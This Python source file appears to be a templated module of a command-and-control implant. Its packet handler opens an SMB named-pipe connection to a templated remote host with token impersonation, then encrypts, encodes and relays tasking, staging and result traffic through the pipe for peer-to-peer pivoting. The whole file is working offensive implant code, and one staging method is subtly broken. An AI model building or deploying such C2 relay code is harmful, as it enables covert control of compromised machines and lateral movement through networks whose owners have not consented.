import base64
import sys
import threading
import time

import clr

clr.AddReference('System.Core')
clr.AddReference("System.IO.Pipes")
import System.Collections.Generic
import System.IO.Pipes
import System.Threading
from System.IO.Pipes import (NamedPipeServerStream, PipeDirection, PipeOptions,
                             PipeTransmissionMode)
from System.Security.Principal import TokenImpersonationLevel


class ExtendedPacketHandler(PacketHandler):
    def __init__(self, agent, staging_key, session_id, headers, server, taskURIs, key=None):
        super().__init__(agent=agent, staging_key=staging_key, session_id=session_id, key=key)
        self.headers = headers
        self.taskURIs = taskURIs
        self.server = server
        self.pipe_name = "{{ pipe_name }}"
        self.host = "{{ host }}"

        # Create a queue to hold data to be sent through the pipe
        self.smb_server_queue = System.Collections.Generic.Queue[str]()
        self.send_queue = System.Collections.Generic.Queue[str]()
        self.receive_queue = System.Collections.Generic.Queue[str]()
        self.pipe_client = System.IO.Pipes.NamedPipeClientStream(self.host, self.pipe_name, PipeDirection.InOut, 0,
                                                            TokenImpersonationLevel.Impersonation)
        # Connect to the server
        self.pipe_client.Connect()

        # Create and start the separate thread for the named pipe connection
        pipe_thread = threading.Thread(target=self.pipe_thread_function)
        pipe_thread.daemon = True
        pipe_thread.start()

    def send_results_for_child(self, received_data):
        """
        Forwards the results of a tasking to the pipe server.
        """
        self.send_queue.Enqueue(received_data)
        return b''

    def send_get_tasking_for_child(self, received_data):
        """
        Forwards the get tasking to the pipe server.
        """
        self.send_queue.Enqueue(received_data)
        return b''

    def send_staging_for_child(self, received_data, hop_name):
        """
        Forwards the staging request to the pipe server.
        """
        self.send_queue.Enqueue(self, received_data)
        return b''

    # Function to run in the separate thread to handle the named pipe connection
    def pipe_thread_function(self):
        while True:
            time.sleep(1)
            if self.send_queue.Count > 0:
                pipe_writer = System.IO.StreamWriter(self.pipe_client)
                pipe_writer.WriteLine(self.send_queue.Peek())
                pipe_writer.Flush()
                self.send_queue.Dequeue()

                recv_pipe_reader = System.IO.StreamReader(self.pipe_client)
                received_data = recv_pipe_reader.ReadLine()
                self.receive_queue.Enqueue(received_data)

    def send_message(self, packets=None):
        data = None

        if packets:
            encData = aes_encrypt_then_hmac(self.key, packets)
            data = self.build_routing_packet(self.staging_key, self.session_id, meta=5, enc_data=encData)
            data = base64.b64encode(data).decode('UTF-8')
            self.send_queue.Enqueue("1" + data)
        else:
            routing_packet = self.build_routing_packet(self.staging_key, self.session_id, meta=4)
            b64routing_packet = base64.b64encode(routing_packet).decode('UTF-8')
            self.send_queue.Enqueue("0" + b64routing_packet)

        while self.receive_queue.Count > 0:
            data = self.receive_queue.Peek()
            data = base64.b64decode(data)
            self.receive_queue.Dequeue()

            try:
                self.agent.send_job_message_buffer()
            except Exception as e:
                result = self.build_response_packet(
                    0, str("[!] Failed to check job buffer!: " + str(e))
                )
                self.process_job_tasking(result)
            if data.strip() == self.agent.defaultResponse.strip() or data == base64.b64encode(self.agent.defaultResponse):
                self.missedCheckins = 0
            else:
                self.decode_routing_packet(data)
        if data:
            return '200', data
        else:
            return '', ''
